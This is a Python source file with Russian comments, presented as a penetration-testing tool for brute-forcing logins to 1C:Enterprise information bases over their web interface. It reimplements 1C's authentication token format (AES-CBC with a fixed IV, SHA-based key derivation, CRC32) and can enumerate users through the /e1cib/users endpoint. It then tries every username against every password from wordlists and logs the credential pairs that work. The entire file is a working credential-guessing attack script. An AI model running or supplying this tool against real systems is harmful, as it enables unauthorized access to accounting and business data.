import base64
import hashlib
import zlib
import struct
import requests
import re
import argparse
import os
import logging
import sys
import secrets
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Настройка логирования
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

# Фиксированный IV для AES (используется для совместимости с 1С; для критичных применений используйте случайный IV)
FIXED_IV = bytes([157, 123, 154, 32, 105, 101, 187, 40, 6, 122, 72, 61, 178, 108, 113, 142])

# Переопределение обработчика исключений для корректного завершения работы при Ctrl+C
_original_excepthook = sys.excepthook
def custom_excepthook(exctype, value, traceback):
    if exctype == KeyboardInterrupt:
        logging.info("Выход...")
    else:
        _original_excepthook(exctype, value, traceback)
sys.excepthook = custom_excepthook

def sha1_base64(input_str: str) -> bytes:
    """
    Возвращает base64-кодированный SHA1-хеш от входной строки.
    """
    sha1_digest = hashlib.sha1(input_str.encode()).digest()
    return base64.b64encode(sha1_digest)

def sha256_digest(data: bytes) -> bytes:
    """
    Возвращает SHA256-хеш от входных данных.
    """
    return hashlib.sha256(data).digest()

def generate_auth_token(password: str, username: str) -> str:
    """
    Генерирует токен аутентификации.

    Алгоритм:
      1. Генерируется первый блок: 32 байта случайных данных шифруются AES-CBC с ключом, 
         полученным как sha256(sha1_base64(password)).
      2. Генерируется второй блок: ещё 32 байта случайных данных шифруются AES-CBC с ключом, 
         полученным как sha256(sha1_base64(password.upper())).
      3. Добавляется имя пользователя с указанием его длины (4 байта, little-endian).
      4. Вычисляется CRC32 для сформированного набора байт и добавляется (4 байта, little-endian).
      5. Итоговый набор байт кодируется в base64 и возвращается.
    """
    token_bytes = bytearray()
    
    # Версия/идентификатор токена
    token_bytes.append(1)
    
    # Первый блок шифрования
    random_block1 = secrets.token_bytes(32)
    key1 = sha256_digest(sha1_base64(password))
    cipher1 = AES.new(key1, AES.MODE_CBC, iv=FIXED_IV)
    encrypted_block1 = cipher1.encrypt(pad(random_block1, AES.block_size))
    token_bytes.append(len(encrypted_block1))
    token_bytes.extend(encrypted_block1)
    
    # Второй блок шифрования
    random_block2 = secrets.token_bytes(32)
    key2 = sha256_digest(sha1_base64(password.upper()))
    cipher2 = AES.new(key2, AES.MODE_CBC, iv=FIXED_IV)
    encrypted_block2 = cipher2.encrypt(pad(random_block2, AES.block_size))
    token_bytes.append(len(encrypted_block2))
    token_bytes.extend(encrypted_block2)
    
    # Добавление имени пользователя: сначала 4 байта длины, затем само имя
    username_bytes = username.encode()
    token_bytes.extend(struct.pack("<I", len(username_bytes)))
    token_bytes.extend(username_bytes)
    
    # Вычисление и добавление контрольной суммы CRC32 (4 байта, little-endian)
    checksum = zlib.crc32(token_bytes)
    token_bytes.extend(struct.pack("<I", checksum))
    
    return base64.b64encode(token_bytes).decode()

def get_version(url: str) -> str:
    """
    Получает версию 1С информационной базы по указанному URL.
    """
    try:
        response = requests.get(f"{url}/")
        response.raise_for_status()
    except Exception as e:
        logging.error(f"Ошибка при получении версии: {e}")
        return ""
    
    match = re.search(r'(?<=var VERSION = ")[0-9\.]+', response.text)
    if match:
        return match.group(0)
    else:
        logging.error("Не удалось определить версию из ответа сервера.")
        return ""

def authenticate(url: str, version: str, credentials: str) -> bool:
    """
    Пытается аутентифицироваться на сервере, используя переданный токен.
    """
    data = {"cred": credentials}
    try:
        response = requests.post(f"{url}/e1cib/login?version={version}", json=data)
        return response.status_code == 200
    except Exception as e:
        logging.error(f"Ошибка при аутентификации: {e}")
        return False

def fetch_users(url: str) -> list:
    """
    Получает список пользователей из информационной базы.
    """
    try:
        response = requests.get(f"{url}/e1cib/users")
        response.raise_for_status()
    except Exception as e:
        logging.error(f"Не удалось получить список пользователей: {e}")
        return []
    return [user.strip() for user in response.text.split("\r\n") if user.strip()]

def check_credentials(username: str, password: str, url: str, version: str) -> bool:
    """
    Проверяет, действительны ли переданные имя пользователя и пароль.
    """
    token = generate_auth_token(password, username)
    return authenticate(url, version, token)

def load_users(args, url: str) -> list:
    """
    Загружает пользователей из аргументов командной строки, файла или через запрос к серверу.
    """
    users = []
    if args.user:
        users.append(args.user)
    if args.users:
        if os.path.exists(args.users):
            with open(args.users, encoding="utf-8") as f:
                file_users = [line.strip() for line in f if line.strip()]
                users.extend(file_users)
        else:
            logging.warning(f"Файл с пользователями {args.users} не существует!")
    if args.get:
        fetched_users = fetch_users(url)
        if fetched_users:
            users.extend(fetched_users)
    users = list(set(users))
    users.sort()
    return users

def load_passwords(args) -> list:
    """
    Загружает пароли из аргументов командной строки или файла.
    """
    passwords = []
    if args.password:
        passwords.append(args.password)
    if args.passwords:
        if os.path.exists(args.passwords):
            with open(args.passwords, encoding="utf-8") as f:
                file_passwords = [line.strip() for line in f if line.strip()]
                passwords.extend(file_passwords)
        else:
            logging.warning(f"Файл с паролями {args.passwords} не существует!")
    return passwords

def main():
    parser = argparse.ArgumentParser(
        description="Пентестерский инструмент для перебора учетных данных 1С информационной базы."
    )
    parser.add_argument("url", help="URL 1С информационной базы")
    parser.add_argument("-u", dest="user", help="Имя пользователя для проверки пароля")
    parser.add_argument("-U", dest="users", help="Файл со списком пользователей")
    parser.add_argument("-p", dest="password", help="Пароль для перебора")
    parser.add_argument("-P", dest="passwords", help="Файл со списком паролей")
    parser.add_argument("-l", dest="get", action="store_true", default=False,
                        help="Получить список пользователей из информационной базы")
    parser.add_argument("-o", dest="output", help="Файл для сохранения результатов")
    args = parser.parse_args()
    
    if not args.url or not args.url.startswith("http"):
        logging.critical(f"{args.url} не является корректным URL!")
        sys.exit(1)
    
    version = get_version(args.url)
    if not version:
        logging.error(f"Не удалось определить версию! URL: {args.url}")
        sys.exit(1)
    logging.info(f"Версия: {version}")
    
    users = load_users(args, args.url)
    if not users:
        logging.critical("Пользователи не загружены!")
        sys.exit(1)
    
    passwords = load_passwords(args)
    if not passwords:
        logging.critical("Пароли не загружены!")
        sys.exit(1)
    
    # Перебор комбинаций пользователей и паролей
    for password in passwords:
        for username in users:
            if check_credentials(username, password, args.url, version):
                logging.info(f"[+] Успешная аутентификация! Пользователь: {username}, Пароль: {password}")

if __name__ == "__main__":
    main()
